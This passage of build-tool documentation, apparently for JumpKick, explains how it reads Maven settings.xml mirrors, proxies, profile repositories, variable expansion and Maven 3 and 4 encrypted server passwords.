`repos/central` tree — only the URL every request opens (POMs, jars, `maven-metadata.xml`,
`.module` files, checksum sidecars) changes on this machine. A lock written behind Nexus is
byte-identical to one written on the open internet. A `[repositories]` table without `mirror-of`
is a real source and lands in every `source` field; the native spelling of a mirror is `mirror-of`
([Mirror or source](#a-corporate-repository-mirror-or-source)). `mirrorOf` follows Maven's grammar
— `*`, `external:*` (everything not on this machine), `external:http:*`, `central,google`,
`*,!jumpkick` — and the first mirror that matches wins, the `config.toml` ones before these. The mirror's credential is the `<server>` with the mirror's own `<id>`,
bound to the mirror URL by the file itself. `jk lock` prints one note per mirrored repository:

```
repository `central` is reached through mirror `nexus` (/home/me/.m2/settings.xml) at
https://nexus.acme.com/repository/maven-public/; the lock records `central` at https://repo.maven.apache.org/maven2/
```

A mirror never goes direct: one that is unreachable or refuses access fails the resolve naming
it, and a plaintext `http://` mirror on a network path — which `settings.xml` has no
`allow-insecure` for — fails every repository it matches, naming the entry and the two ways out:
https, or the same mirror in `config.toml` with `allow-insecure = true`. The repository is never
asked at its own URL in the mirror's place; a loopback mirror is fine. A `<repository>` a dependency's
POM declares goes through the mirror too, and so does every resolve that runs with no project in
hand: `jk run Foo.java` (and a repository its header names), a tool run by its coordinate,
`jk format`'s formatter jars, build logic's pinned Groovy, the plugin workers' own closures and a
giter8 template's `maven()` property each ask your `~/.jk/config.toml` repositories over the
built-in remotes, through the mirror, the way a build does. The engine's not-found memo is keyed by the URL a request
opened, so a mirror that appears is asked afresh for a coordinate the repository missed before it
existed, and a mirror removed leaves the repository asked afresh at its own URL. A `file://`
repository and a loopback one are never memoized — not their misses, not their version lists: a
directory on this disk (a workspace path, a git materialization) that gains an artifact is seen on
the next ask, without `--force`. A loopback repository's store tree (`repos/127.0.0.1-…`) is
likewise one process's: the first time an engine process touches it, whatever a previous process
stored there is removed, so a stub that reappears on a reused port in a later run never serves a
predecessor's artifacts from disk. Within one engine's lifetime the tree is a warm store like any
other; an ssh-tunnelled repository re-downloads once per engine lifetime.

**A `<proxy>` is JumpKick's proxy for every request** — artifacts, JDK and tool distributions, forge
APIs — for the protocol it names, between `~/.jk/config.toml [network]` and the shell's
`https_proxy` / `http_proxy` — see [Config § Network](config.md#network). Its username and
password ride as Basic; its `nonProxyHosts` (`|`-separated globs) go direct. A proxy that admits
only the artifact host lists the other hosts in `nonProxyHosts`, or `[network]` replaces it.

**Active-profile repositories join the project's.** For a coexistence build and for `jk import`,
the `<repositories>` of every profile that `<activeProfiles>` lists (or that is
`activeByDefault` when none is listed) are added to the imported `[repositories]` after the POM's
own, with their `<releases>` / `<snapshots>` policy, and consulted for parents and BOMs during the
import. Their `<server>` credentials are bound to their URLs by the file. These are real
repositories: an artifact resolved from one is recorded under its id in the lock.

Two files are read and merged the way Maven merges them: the user's `~/.m2/settings.xml` over
`$M2_HOME/conf/settings.xml` (or `$MAVEN_HOME`); an id in the user's file hides the same id in the
installation's, and the active-profile ids are the union. `JK_M2_SETTINGS=<file>` names another
user file (Maven's `-s`). Both files are re-read when they change, so editing one needs no
`jk engine stop`. `jk doctor` prints which files the engine read, every mirror with the built-in
remotes it stands in for, the proxies and the profile repositories. Not read:
`<pluginRepositories>`, `<pluginGroups>`, and a `<server>`'s `<privateKey>`, `<passphrase>` and
`<configuration>` (a private key serves scp and sftp repositories, which JumpKick does not speak).

### `${...}` in `settings.xml`

Every value is expanded the way Maven expands it, so `<password>${env.NEXUS_PASSWORD}</password>`
keeps the password out of the file:

- `${env.NAME}` is the variable as the shell that ran `jk` has it, not the shell that started the
  engine: `NEXUS_PASSWORD=… jk build` works against a resident engine.
- `${user.home}`, `${os.name}`, `${java.home}` and the other system properties Maven exposes;
  `${user.dir}` is the directory `jk` ran in and `${maven.home}` the installation `M2_HOME` /
  `MAVEN_HOME` names.
- `${settings.*}` and `${project.*}` are not expanded, as in Maven.

This covers `<server>` usernames and passwords, `<mirror>`, `<proxy>` and profile
repository URLs, and `<localRepository>`. An expression that does not resolve stays as written,
as Maven leaves it, and JumpKick warns once per run, naming the file, the element and the expression
(`` <server> `nexus` <password> names ${env.NEXUS_PASSWORD} ``) —
the literal will answer 401, and the warning says why. An unresolved `<localRepository>` falls
back to `~/.m2/repository` instead. `jk doctor` shows mirror URLs expanded, with any credential in
them removed.

### Encrypted passwords

A `<server>` or `<proxy>` password that `mvn --encrypt-password` wrote (`{COQLCE6DU6GtcS5P=}`) is
decrypted the way Maven 3 decrypts it: with the master password in `~/.m2/settings-security.xml`,
itself written by `mvn --encrypt-master-password`. `JK_M2_SETTINGS_SECURITY=<file>` names another
security file (Maven's `-Dsettings.security`), and a `<relocation>` in the file is followed; a
relative relocation is taken against the directory of the file that names it. Text outside the
braces is a comment, as in Maven. A value that does not decrypt — no security file, a master that
does not decrypt, a different master — is not sent: JumpKick warns once per run, naming the `<server>`
id and the file, and the repository is accessed anonymously.

This is compatibility, not protection. The master password that unlocks every value sits beside
them, under a passphrase that is the same on every machine, so anyone who can read both files can
read the passwords. JumpKick reads the format so a working Maven setup keeps working, and does not
write it. To keep a credential out of plain text, use [`jk repo login`](#credentials), or a
`${file:…}` or `${cmd:…}` reference in `~/.jk/config.toml`.

Maven 4's `mvnenc` format (`{[name=master,cipher=AES/GCM/NoPadding,version=…]…}`) is decrypted
too, with the master password that the `master` configuration of `~/.m2/settings-security4.xml`
names a source for (`JK_M2_SETTINGS_SECURITY4=<file>` names another file, Maven's
`-Dmaven.settings.security`). JumpKick reads the sources that need nobody at the keyboard:

| Source | Read as |
|---|---|
| `env:NAME` | the variable in the shell that ran `jk`, like `${env.NAME}` |
| `file:/absolute/path` | the file's first line that does not start with `#` |
| `gpg-agent:socket` | the passphrase the agent has cached for Maven; JumpKick always asks with `--no-ask`, so the agent never opens a pinentry, `?non-interactive` or not |

`console-prompt`, `pinentry-prompt:` and `onepassword:` ask someone for the password, and
`system-property:` reads Maven's own JVM, so JumpKick does not read them: the value is dropped with a
warning naming the source, as for any password that does not decrypt. A `masterSourceLookup`
value (`{[name=masterSourceLookup,…]env:NAME}`) reads its source the same way, and a `legacy` one
is Maven 3's format above. When gpg-agent has nothing cached, let a `mvn` run ask for it once
(without `?non-interactive`, Maven's pinentry caches it), or preset it with `gpg-preset-passphrase`
under the cache id `plexus:secDispatcherMasterPassword`; JumpKick asks the agent again on every
command.

The `gpg-agent:` source is verified on Linux against a real agent (`jk test -p live`). It needs
the agent's Unix socket. On macOS it is unverified: macOS ships no GnuPG, and the live test needs
one on `PATH` (GnuPG 2.1 or later from Homebrew, MacPorts or GPG Suite, whose agent listens on a
Unix socket as on Linux); without it the test is skipped. On
Windows it is unsupported and unverified: Gpg4win's agent socket is an emulation file, not a
socket JumpKick connects to, so use `env:` or `file:` there.

## Related

[Lockfile](lockfile.md) · [Publish](publish.md) · [Dependencies](dependencies.md)
